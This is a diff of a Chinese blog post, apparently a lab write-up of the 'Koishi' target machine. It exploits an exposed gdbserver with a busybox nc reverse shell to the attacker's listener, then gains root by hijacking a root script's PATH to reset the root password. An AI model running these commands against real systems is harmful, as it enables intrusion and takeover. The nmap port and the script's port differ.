@@ -18,7 +18,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Koishi.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Koishi</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -42,17 +42,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -86,7 +76,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <p>老规矩，先找出靶机 IP，然后挂后台扫端口。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l   
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -96,12 +86,12 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.254 00:50:56:ef:a8:26       VMware, Inc.
 
 4 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.978 seconds (129.42 hosts/sec). 4 responded
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded
                                                                                                                                                                                 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p 0-65535 192.168.205.144
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 00:52 -0500
-Nmap scan report <span class="pl-k">for</span> 192.168.205.144
+Nmap scan report for 192.168.205.144
 Host is up (0.00098s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT      STATE SERVICE
@@ -110,39 +100,42 @@ PORT      STATE SERVICE
 43923/tcp open  unknown
 MAC Address: 08:00:27:7D:B0:F7 (Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 5.69 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
+</code></pre>
 <p>扫出来 22、80，还有一个 43923 端口 nmap 识别不出服务。</p>
-<p>这里我走了很长一段弯路。Web 端去看了，有 info.php 和一个纯假 shell 的 eval.php。主页 index.php 虽然可以通过 action 和 file 参数结合 <code class="notranslate">/proc/self/root/</code> 跳回根目录读文件，但没有可以推进进展的东西。同时 43923 这个端口非常脆弱，大量发包扫描会直接把它扫死，当时在这里卡了很久，最后确定突破口只能在这个高危端口上。</p>
+<p>这里我走了很长一段弯路。Web 端去看了，有 info.php 和一个纯假 shell 的 eval.php。主页 index.php 虽然可以通过 action 和 file 参数结合 <code>/proc/self/root/</code> 跳回根目录读文件，但没有可以推进进展的东西。同时 43923 这个端口非常脆弱，大量发包扫描会直接把它扫死，当时在这里卡了很久，最后确定突破口只能在这个高危端口上。</p>
 <h1>探测 GDBServer</h1>
 <p>如果实在不知道 43923 是什么服务，有个耍赖皮的办法：直接看虚拟机的启动屏幕。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/acbfc659523b5c44f8d52189efa3f42df7fde1cfbb9810e6a88d1cd6b1d8f69a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633393335382e77656270"><img src="https://camo.githubusercontent.com/acbfc659523b5c44f8d52189efa3f42df7fde1cfbb9810e6a88d1cd6b1d8f69a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633393335382e77656270" alt="image-20260304135734174" data-canonical-src="http://7r1UMPHK.github.io/image/20260304211639358.webp" style="max-width: 100%;"></a></p>
+<p><img src="http://7r1UMPHK.github.io/image/20260304211639358.webp" alt="image-20260304135734174" /></p>
 <p>启动项里明明白白写着起了个 gdbserver。</p>
 <p>如果不依赖这种“物理外挂”，正经的探测方式是向端口发送特定的 GDB 握手包。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp]
-└─$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>$qSupported#37<span class="pl-pds">'</span></span> <span class="pl-k">|</span> timeout 2 nc 192.168.205.144 43923
-+<span class="pl-smi">$PacketSize</span>=2001f<span class="pl-k">;</span>QPassSignals+<span class="pl-k">;</span>QProgramSignals+<span class="pl-k">;</span>QStartupWithShell+<span class="pl-k">;</span>QEnvironmentHexEncoded+<span class="pl-k">;</span>QEnvironmentReset+<span class="pl-k">;</span>QEnvironmentUnset+<span class="pl-k">;</span>QSetWorkingDir+<span class="pl-k">;</span>QCatchSyscalls+<span class="pl-k">;</span>qXfer:libraries-svr4:read+<span class="pl-k">;</span>augmented-libraries-svr4-read+<span class="pl-k">;</span>qXfer:auxv:read+<span class="pl-k">;</span>qXfer:siginfo:read+<span class="pl-k">;</span>qXfer:siginfo:write+<span class="pl-k">;</span>qXfer:features:read+<span class="pl-k">;</span>QStartNoAckMode+<span class="pl-k">;</span>qXfer:osdata:read+<span class="pl-k">;</span>multiprocess+<span class="pl-k">;</span>fork-events+<span class="pl-k">;</span>vfork-events+<span class="pl-k">;</span>exec-events+<span class="pl-k">;</span>QNonStop+<span class="pl-k">;</span>QDisableRandomization+<span class="pl-k">;</span>qXfer:threads:read+<span class="pl-k">;</span>ConditionalTracepoints+<span class="pl-k">;</span>TraceStateVariables+<span class="pl-k">;</span>TracepointSource+<span class="pl-k">;</span>DisconnectedTracing+<span class="pl-k">;</span>StaticTracepoints+<span class="pl-k">;</span>InstallInTrace+<span class="pl-k">;</span>qXfer:statictrace:read+<span class="pl-k">;</span>qXfer:traceframe-info:read+<span class="pl-k">;</span>EnableDisableTracepoints+<span class="pl-k">;</span>QTBuffer:size+<span class="pl-k">;</span>tracenz+<span class="pl-k">;</span>ConditionalBreakpoints+<span class="pl-k">;</span>BreakpointCommands+<span class="pl-k">;</span>QAgent+<span class="pl-k">;</span>Qbtrace:bts+<span class="pl-k">;</span>Qbtrace-conf:bts:size+<span class="pl-k">;</span>Qbtrace:pt+<span class="pl-k">;</span>Qbtrace-conf:pt:size+<span class="pl-k">;</span>Qbtrace:off+<span class="pl-k">;</span>qXfer:btrace:read+<span class="pl-k">;</span>qXfer:btrace-conf:read+<span class="pl-k">;</span>swbreak+<span class="pl-k">;</span>hwbreak+<span class="pl-k">;</span>qXfer:exec-file:read+<span class="pl-k">;</span>vContSupported+<span class="pl-k">;</span>QThreadOptions=3<span class="pl-k">;</span>QThreadEvents+<span class="pl-k">;</span>no-resumed+<span class="pl-c"><span class="pl-c">#</span>fa</span></pre></div>
-<p>看到返回内容里带了 <code class="notranslate">PacketSize</code>、<code class="notranslate">qXfer</code> 这些特有的字段，就能确诊这是 gdb remote 协议了。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/tmp]
+└─$ printf '$qSupported#37' | timeout 2 nc 192.168.205.144 43923
++$PacketSize=2001f;QPassSignals+;QProgramSignals+;QStartupWithShell+;QEnvironmentHexEncoded+;QEnvironmentReset+;QEnvironmentUnset+;QSetWorkingDir+;QCatchSyscalls+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;fork-events+;vfork-events+;exec-events+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalTracepoints+;TraceStateVariables+;TracepointSource+;DisconnectedTracing+;StaticTracepoints+;InstallInTrace+;qXfer:statictrace:read+;qXfer:traceframe-info:read+;EnableDisableTracepoints+;QTBuffer:size+;tracenz+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+;Qbtrace:bts+;Qbtrace-conf:bts:size+;Qbtrace:pt+;Qbtrace-conf:pt:size+;Qbtrace:off+;qXfer:btrace:read+;qXfer:btrace-conf:read+;swbreak+;hwbreak+;qXfer:exec-file:read+;vContSupported+;QThreadOptions=3;QThreadEvents+;no-resumed+#fa
+</code></pre>
+<p>看到返回内容里带了 <code>PacketSize</code>、<code>qXfer</code> 这些特有的字段，就能确诊这是 gdb remote 协议了。</p>
 <h1>漏洞利用与初始据点</h1>
-<p>gdbserver 暴露在公网可以直接弹 shell，这也是常规套路了。不过根据这个靶机的体积判断，底层大概率是 Alpine Linux，这意味着系统里没有 bash，只能指望 sh 或者 ash，并且可能有 busybox。<br>
+<p>gdbserver 暴露在公网可以直接弹 shell，这也是常规套路了。不过根据这个靶机的体积判断，底层大概率是 Alpine Linux，这意味着系统里没有 bash，只能指望 sh 或者 ash，并且可能有 busybox。
 因为这个端口极其不稳定，死了还得重启虚拟机巨麻烦，所以 payload 必须尽量一发入魂。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
-listening on [any] 8888 ...</pre></div>
+listening on [any] 8888 ...
+</code></pre>
 <p>起个监听。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/tmp]
 └─$ cat a.sh 
-IP=192.168.205.144<span class="pl-k">;</span>LHOST=192.168.205.128<span class="pl-k">;</span>LPORT=8888
-gdb -q -nx -ex <span class="pl-s"><span class="pl-pds">"</span>set pagination off<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>set confirm off<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>target extended-remote <span class="pl-smi">$IP</span>:36127<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>set remote exec-file /bin/busybox<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>set args sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2&gt;&amp;1|/bin/busybox nc <span class="pl-smi">$LHOST</span> <span class="pl-smi">$LPORT</span> &gt;/tmp/p'<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>run<span class="pl-pds">"</span></span> -ex <span class="pl-s"><span class="pl-pds">"</span>quit<span class="pl-pds">"</span></span>
+IP=192.168.205.144;LHOST=192.168.205.128;LPORT=8888
+gdb -q -nx -ex &quot;set pagination off&quot; -ex &quot;set confirm off&quot; -ex &quot;target extended-remote $IP:36127&quot; -ex &quot;set remote exec-file /bin/busybox&quot; -ex &quot;set args sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2&gt;&amp;1|/bin/busybox nc $LHOST $LPORT &gt;/tmp/p'&quot; -ex &quot;run&quot; -ex &quot;quit&quot;
                                                                                                                                                                                 
 ┌──(kali㉿kali)-[/tmp]
 └─$ bash a.sh 
 Remote debugging using 192.168.205.144:36127
-Starting program:  sh -c <span class="pl-s"><span class="pl-pds">'</span>rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2&gt;&amp;1|/bin/busybox nc 192.168.205.128 8888 &gt;/tmp/p<span class="pl-pds">'</span></span>
+Starting program:  sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2&gt;&amp;1|/bin/busybox nc 192.168.205.128 8888 &gt;/tmp/p'
 Reading /bin/busybox from remote target...
-⚠️ warning: File transfers from remote targets can be slow. Use <span class="pl-s"><span class="pl-pds">"</span>set sysroot<span class="pl-pds">"</span></span> to access files locally instead.
+⚠️ warning: File transfers from remote targets can be slow. Use &quot;set sysroot&quot; to access files locally instead.
 Reading /bin/busybox from remote target...
 Reading symbols from target:/bin/busybox...
-(No debugging symbols found <span class="pl-k">in</span> target:/bin/busybox)
+(No debugging symbols found in target:/bin/busybox)
 Reading /lib/ld-musl-x86_64.so.1 from remote target...
 Reading /lib/ld-musl-x86_64.so.1 from remote target...
 Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
@@ -151,62 +144,68 @@ Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
 [Detaching after fork from child process 2534]
 [Detaching after fork from child process 2535]
 [Detaching after fork from child process 2536]
-[Detaching after fork from child process 2537]</pre></div>
-<p>写了个脚本自动跑 gdb 配置，指定远程执行 <code class="notranslate">/bin/busybox</code> 并传入反弹 shell 的命令。执行后 gdb 成功附加上去并 fork 了子进程。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+[Detaching after fork from child process 2537]
+</code></pre>
+<p>写了个脚本自动跑 gdb 配置，指定远程执行 <code>/bin/busybox</code> 并传入反弹 shell 的命令。执行后 gdb 成功附加上去并 fork 了子进程。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 42107
-/bin/sh: can<span class="pl-s"><span class="pl-pds">'</span>t access tty; job control turned off</span>
-<span class="pl-s">~ $ id</span>
-<span class="pl-s">uid=1000(514) gid=1000(514) groups=1000(514)</span></pre></div>
+/bin/sh: can't access tty; job control turned off
+~ $ id
+uid=1000(514) gid=1000(514) groups=1000(514)
+</code></pre>
 <p>切回监听窗口，shell 已经稳稳接到了，当前用户是 514。</p>
 <h1>环境稳定与提权信息收集</h1>
 <p>到手的是个残废 shell，老规矩先做交互式处理。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 -c <span class="pl-s"><span class="pl-pds">'</span>import pty;pty.spawn("/bin/ash")<span class="pl-pds">'</span></span>
+<pre lang="bash"><code>python3 -c 'import pty;pty.spawn(&quot;/bin/ash&quot;)'
 Ctrl+Z
-stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+stty raw -echo; fg
 reset xterm
-<span class="pl-k">export</span> TERM=xterm
-<span class="pl-k">export</span> SHELL=/bin/ash
-stty rows 36 columns 178</pre></div>
+export TERM=xterm
+export SHELL=/bin/ash
+stty rows 36 columns 178
+</code></pre>
 <p>这里特意把 SHELL 设成了 /bin/ash 适配 Alpine。接着跑了个枚举脚本省事，搜集一波系统信息。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a941be9bce6157da93cee0c743758b4465b947c5cf4d1d975f92cccfa3d62313/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633363938302e77656270"><img src="https://camo.githubusercontent.com/a941be9bce6157da93cee0c743758b4465b947c5cf4d1d975f92cccfa3d62313/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633363938302e77656270" alt="image-20260304142209164" data-canonical-src="http://7r1UMPHK.github.io/image/20260304211636980.webp" style="max-width: 100%;"></a></p>
-<p>脚本结果显示 <code class="notranslate">/usr/local/bin</code> 目录我们当前用户有写入权限。其实在前面打 web 测试任意文件读取时，我通过读 <code class="notranslate">/proc</code> 下的文件已经察觉到这台机器上有个定时任务一直在跑，结合这里的写入权限，思路一下子就通了。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20260304211636980.webp" alt="image-20260304142209164" /></p>
+<p>脚本结果显示 <code>/usr/local/bin</code> 目录我们当前用户有写入权限。其实在前面打 web 测试任意文件读取时，我通过读 <code>/proc</code> 下的文件已经察觉到这台机器上有个定时任务一直在跑，结合这里的写入权限，思路一下子就通了。</p>
 <p>顺着定时任务往下查，找到了它调用的本体脚本。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c1ff5bafe944cb3434bba2f79bf3a38b7d7de9884bbfe032af5ed918ed50adbc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633373931302e77656270"><img src="https://camo.githubusercontent.com/c1ff5bafe944cb3434bba2f79bf3a38b7d7de9884bbfe032af5ed918ed50adbc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303330343231313633373931302e77656270" alt="image-20260304142531974" data-canonical-src="http://7r1UMPHK.github.io/image/20260304211637910.webp" style="max-width: 100%;"></a></p>
-<p>看下这个 <code class="notranslate">/usr/bin/monitor</code> 的权限和内容。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> $ ls -al /usr/bin/monitor
+<p><img src="http://7r1UMPHK.github.io/image/20260304211637910.webp" alt="image-20260304142531974" /></p>
+<p>看下这个 <code>/usr/bin/monitor</code> 的权限和内容。</p>
+<pre lang="bash"><code>~ $ ls -al /usr/bin/monitor
 -rwxr-xr-x    1 root     root           141 Jan 24 01:33 /usr/bin/monitor
-<span class="pl-k">~</span> $ cat /usr/bin/monitor
-<span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
+~ $ cat /usr/bin/monitor
+#!/bin/sh
 i=1
-<span class="pl-k">while</span> [ <span class="pl-smi">$i</span> <span class="pl-k">-le</span> 3 ]<span class="pl-k">;</span> <span class="pl-k">do</span>
-    <span class="pl-k">if</span> [ <span class="pl-k">!</span> <span class="pl-k">-f</span> /home/514/protected/secret ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+while [ $i -le 3 ]; do
+    if [ ! -f /home/514/protected/secret ]; then
         warning
-    <span class="pl-k">fi</span>
+    fi
     sleep 2
-    i=<span class="pl-s"><span class="pl-pds">$((</span>i<span class="pl-k">+</span><span class="pl-c1">1</span><span class="pl-pds">))</span></span>
-<span class="pl-k">done</span>
-<span class="pl-k">~</span> $ cat /home/514/protected/secret
-thisissupersecret<span class="pl-k">!</span></pre></div>
-<p>这个 root 权限运行的 monitor 脚本逻辑很简单：每隔几秒检查 <code class="notranslate">secret</code> 文件存不存在，如果不存在，就执行 <code class="notranslate">warning</code>。我去读了一下 <code class="notranslate">secret</code>，里面的内容不是密码，纯粹是个干扰项。</p>
+    i=$((i+1))
+done
+~ $ cat /home/514/protected/secret
+thisissupersecret!
+</code></pre>
+<p>这个 root 权限运行的 monitor 脚本逻辑很简单：每隔几秒检查 <code>secret</code> 文件存不存在，如果不存在，就执行 <code>warning</code>。我去读了一下 <code>secret</code>，里面的内容不是密码，纯粹是个干扰项。</p>
 <h1>PATH 劫持提权</h1>
-<p>这里就是破局点了。脚本里调用 <code class="notranslate">warning</code> 的时候并没有写绝对路径（比如 <code class="notranslate">/usr/bin/warning</code>），这就意味着系统会去查 PATH 环境变量。而我们刚好对通常在 PATH 极前面的 <code class="notranslate">/usr/local/bin</code> 有写入权限，这就是明摆着的 PATH 劫持。</p>
-<p>只要把 <code class="notranslate">secret</code> 文件干掉触发 <code class="notranslate">warning</code>，再在 <code class="notranslate">/usr/local/bin</code> 写个恶意的 <code class="notranslate">warning</code> 脚本，就能以 root 权限执行任意命令。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/tmp $ rm -rf /home/514/protected/secret
-rm: can<span class="pl-s"><span class="pl-pds">'</span>t remove <span class="pl-pds">'</span></span>/home/514/protected/secret<span class="pl-s"><span class="pl-pds">'</span>: Permission denied</span>
-<span class="pl-s">/tmp $ mv /home/514/protected/ /home/514/1</span>
-<span class="pl-s">/tmp $ echo <span class="pl-pds">'</span></span>echo <span class="pl-s"><span class="pl-pds">"</span>root:root123<span class="pl-pds">"</span></span> <span class="pl-k">|</span> chpasswd<span class="pl-s"><span class="pl-pds">'</span> &gt; /usr/local/bin/warning;chmod +x /usr/local/bin/warning</span>
-<span class="pl-s">/tmp $ cat /usr/local/bin/warning</span>
-<span class="pl-s">echo "root:root123" | chpasswd</span>
-<span class="pl-s">/tmp $ su -</span>
-<span class="pl-s">Password: </span>
-<span class="pl-s">Koishi:~# id</span>
-<span class="pl-s">uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span>
-<span class="pl-s">Koishi:~# cat /root/root.txt /home/514/user.txt </span>
-<span class="pl-s">flag{root-7bd5942949d04a7abfa7b9af22704ae2}</span>
-<span class="pl-s">flag{user-dab89930872234e42142674ea25869dc}</span></pre></div></div>
+<p>这里就是破局点了。脚本里调用 <code>warning</code> 的时候并没有写绝对路径（比如 <code>/usr/bin/warning</code>），这就意味着系统会去查 PATH 环境变量。而我们刚好对通常在 PATH 极前面的 <code>/usr/local/bin</code> 有写入权限，这就是明摆着的 PATH 劫持。</p>
+<p>只要把 <code>secret</code> 文件干掉触发 <code>warning</code>，再在 <code>/usr/local/bin</code> 写个恶意的 <code>warning</code> 脚本，就能以 root 权限执行任意命令。</p>
+<pre lang="bash"><code>/tmp $ rm -rf /home/514/protected/secret
+rm: can't remove '/home/514/protected/secret': Permission denied
+/tmp $ mv /home/514/protected/ /home/514/1
+/tmp $ echo 'echo &quot;root:root123&quot; | chpasswd' &gt; /usr/local/bin/warning;chmod +x /usr/local/bin/warning
+/tmp $ cat /usr/local/bin/warning
+echo &quot;root:root123&quot; | chpasswd
+/tmp $ su -
+Password: 
+Koishi:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+Koishi:~# cat /root/root.txt /home/514/user.txt 
+flag{root-7bd5942949d04a7abfa7b9af22704ae2}
+flag{user-dab89930872234e42142674ea25869dc}
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -231,7 +230,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 